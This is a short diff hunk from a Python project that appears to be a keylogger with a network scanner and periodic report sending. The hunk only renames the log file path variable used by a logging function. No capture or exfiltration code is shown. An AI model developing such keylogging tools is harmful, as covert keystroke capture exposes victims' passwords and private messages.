@@ -19,10 +19,10 @@ from IPy import IP  # For Scanner
 
 
 SEND_REPORT_EVERY = 30
-PATH = "C:\keyLogger\logs\logs_" + str(time.monotonic_ns()) + ".txt"
+PATH_OF_THE_LOGS = "C:\keyLogger\logs\logs_" + str(time.monotonic_ns()) + ".txt"
 
 def logging(text):
-    arquivo = open(PATH, 'a')
+    arquivo = open(PATH_OF_THE_LOGS, 'a')
     arquivo.writelines(str(time.ctime()) + "    " + text + "\n")
     arquivo.close()
 
